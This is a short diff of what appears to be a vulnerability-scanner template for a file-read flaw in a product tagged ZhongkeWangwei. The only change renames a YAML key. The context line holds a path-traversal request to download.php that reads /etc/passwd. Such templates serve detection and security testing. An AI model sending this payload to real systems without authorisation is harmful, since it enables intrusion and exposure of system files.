@@ -6,7 +6,7 @@ info:
   severity: high
   tags: ZhongkeWangwei,fileRead
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/download.php?&class=vpn&toolname=../../../../../../../../etc/passwd"
